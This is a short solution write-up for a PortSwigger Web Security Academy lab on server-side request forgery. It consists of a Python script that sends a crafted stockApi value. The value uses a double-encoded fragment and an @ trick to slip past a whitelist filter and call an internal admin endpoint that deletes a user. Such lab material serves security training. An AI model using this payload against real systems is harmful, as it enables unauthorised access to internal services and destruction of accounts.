# Lab: SSRF with whitelist-based input filter

Link to lab: https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter

## Solution
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'Host': '0a6d00a604cebe45c2f8ac6000c100a2.web-security-academy.net',
    'Content-Type': 'application/x-www-form-urlencoded',
}

data = 'stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos'

response = requests.post(
    'https://0a6d00a604cebe45c2f8ac6000c100a2.web-security-academy.net/product/stock',
    headers=headers,
    data=data,
    verify=False,
)
```